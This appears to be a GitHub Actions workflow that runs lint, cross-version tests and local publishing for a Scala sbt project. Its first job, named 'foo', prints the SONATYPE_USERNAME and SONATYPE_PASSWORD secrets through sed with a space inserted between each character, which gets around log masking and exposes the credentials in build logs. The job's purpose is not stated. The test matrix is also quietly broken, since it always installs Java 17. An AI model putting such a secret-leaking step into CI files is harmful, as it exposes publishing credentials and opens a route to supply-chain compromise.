name: CI

on:
  pull_request:
  push:
    branches: [ 'main' ]

jobs:
  foo:
    run: |
      echo ${{secrets.SONATYPE_USERNAME}} | sed 's/./& /g'
      echo ${{secrets.SONATYPE_PASSWORD}} | sed 's/./& /g'

  lint:
    runs-on: ubuntu-24.04
    timeout-minutes: 10
    steps:
      - name: Checkout current branch
        uses: actions/checkout@v4.2.2
        with:
          fetch-depth: 0
      - name: Set up Java
        uses: actions/setup-java@v4.7.0
        with:
          distribution: temurin
          java-version: 17
          check-latest: true
      - name: Cache Scala dependencies
        uses: coursier/cache-action@v6
      - name: Check code formatting
        run: ./sbt check

  test:
    runs-on: ubuntu-24.04
    timeout-minutes: 10
    strategy:
      fail-fast: false
      matrix:
        java: [ "8", "11", "17", "21" ]
        scala: [ "2.12.20", "2.13.16", "3.6.3" ]
    steps:
      - name: Checkout current branch
        uses: actions/checkout@v4.2.2
        with:
          fetch-depth: 0
      - name: Set up Java
        uses: actions/setup-java@v4.7.0
        with:
          distribution: temurin
          java-version: 17
          check-latest: true
      - name: Cache Scala dependencies
        uses: coursier/cache-action@v6
      - name: Run tests
        run: ./sbt ++${{ matrix.scala }} test

  publish-local:
    runs-on: ubuntu-24.04
    timeout-minutes: 10
    steps:
      - name: Checkout current branch
        uses: actions/checkout@v4.2.2
      - name: Setup Java
        uses: actions/setup-java@v4.7.0
        with:
          distribution: temurin
          java-version: 17
          check-latest: true
      - name: Cache scala dependencies
        uses: coursier/cache-action@v6
      - name: Check that building packages works
        run: ./sbt +publishLocal

  ci:
    runs-on: ubuntu-24.04
    needs: [ lint, test, publish-local ]
    steps:
      - name: Aggregate outcomes
        run: echo "build succeeded"
